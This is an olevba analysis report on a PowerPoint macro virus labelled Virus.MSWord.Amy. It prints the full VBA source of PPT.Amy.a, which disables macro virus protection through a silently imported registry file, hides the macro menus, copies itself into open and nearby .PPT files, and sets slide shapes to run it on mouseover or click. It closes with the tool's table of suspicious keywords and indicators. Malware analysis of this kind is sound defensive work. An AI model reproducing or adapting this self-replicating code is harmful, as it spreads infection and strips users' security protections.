olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Amy-415169659ab7bc4b8fb2e8ac377d2d2ae3b15761
Type: PPT
-------------------------------------------------------------------------------
VBA MACRO Class1.cls 
in file: None - OLE stream: 'VBA/Class1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: None - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub LACO()
On Error Resume Next
With ActivePresentation.VBProject.VBComponents("LACOPHRONE")
.Export ("C:\CONFIG.LAC")
End With

With CommandBars("Tools")
.Controls("Macro").Enabled = 0
.Controls("Customize...").Enabled = 0
End With
Open "c:\power.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options]"
Print #1, """MacroVirusProtection""=dword:00000000"
Close 1
Shell "regedit /s c:\power.reg", vbHide
For i = 1 To Presentations.Count
If Presentations(i).VBProject.VBComponents(1).Name <> "LACOPHRONE" Then
With Presentations(i).VBProject.VBComponents
.Import("C:\CONFIG.LAC").Name = "LACOPHRONE"
End With
End If
Next
For Each kilo In ActivePresentation.Slides(ActivePresentation.Slides.Count).Shapes
With kilo.ActionSettings(ppMouseOver)
.Action = ppActionRunMacro
.Run "LACOPHRONE"
End With
With kilo.ActionSettings(ppMouseClick)
.Action = ppActionRunMacro
.Run "LACOPHRONE"
End With
Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: None - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub LACO()
On Error Resume Next
With ActivePresentation.VBProject.VBComponents("LACOPHRONE")
.Export ("C:\CONFIG.LAC")
End With

With CommandBars("Tools")
.Controls("Macro").Enabled = 0
.Controls("Customize...").Enabled = 0
End With
Open "c:\power.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\PowerPoint\Options]"
Print #1, """MacroVirusProtection""=dword:00000000"
Close 1
Shell "regedit /s c:\power.reg", vbHide
For i = 1 To Presentations.Count
If Presentations(i).VBProject.VBComponents(1).Name <> "LACOPHRONE" Then
With Presentations(i).VBProject.VBComponents
.Import("C:\CONFIG.LAC").Name = "LACOPHRONE"
End With
End If
Next
For Each kilo In ActivePresentation.Slides(ActivePresentation.Slides.Count).Shapes
With kilo.ActionSettings(ppMouseOver)
.Action = ppActionRunMacro
.Run "LACOPHRONE"
End With
With kilo.ActionSettings(ppMouseClick)
.Action = ppActionRunMacro
.Run "LACOPHRONE"
End With
Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: None - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const OurAmy = "Amy"
Public SlideAmy As Object
'----------------------------------------------------------------
'PPT.Amy.a
'By -KD- [Metaphase VX Team & NoMercyVirusTeam]
'Greets to Raven, KidCypher, Error-, Foxz, Evul, Roadkil, Tally
'JFK, Slagehammer, AngelsKitten, BSL4, Antistate and #virus
'----------------------------------------------------------------
Sub A\(Amy): On Error Resume Next
If Dir(Application.Path & ".VXD") = "" Then _
ActivePresentation.VBProject.VBComponents(OurAmy).Export Application.Path & ".VXD"
For Each SlideAmy In Presentations
CatchAmy
Next
With Application.FileSearch
 .LookIn = ActivePresentation.Path
 .FileName = "*.PPT"
 .SearchSubFolders = True
 .Execute
 For MyAmy = 1 To .FoundFiles.Count
If .FoundFiles(MyAmy) = ActivePresentation.FullName Then GoTo CatchThis
 Set SlideAmy = Presentations.Open(.FoundFiles(MyAmy))
If SlideAmy.VBProject.VBComponents(OurAmy).Name <> OurAmy Then
 Call CatchAmy
 SlideAmy.Save
End If
SlideAmy.Close
CatchThis Next
End With
End Sub
Private Sub CatchAmy()
On Error Resume Next
If SlideAmy.VBProject.VBComponents(OurAmy).Name <> OurAmy Then
 SlideAmy.VBProject.VBComponents.Import Application.Path & ".VXD"
 For Each AmyAction In SlideAmy.Slides(SlideAmy.Slides.Count).Shapes
If AmyAction.ActionSettings(ppMouseOver).Action = 0 Then
AmyAction.ActionSettings(ppMouseOver).Action = ppActionRunMacro
AmyAction.ActionSettings(ppMouseOver).Run = "A\"
If Day(Date) = "1" Or Day(Date) = "25" Then
Assistant.Visible = True
  With Assistant.NewBalloon
   .Icon = msoIconAlert
   .Text = "Here I am again. again overwhelming feelings. thousand miles away. part of me is here."
   .Heading = "PPT.Amy.a"
   .Animation = msoAnimationGetTechy
   .Show
  End With
Shell "Start http://www.nod32.com.au/"
End If
Next
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.nod32.com|URL                                          |
|          |.au/                |                                             |
|IOC       |power.reg           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

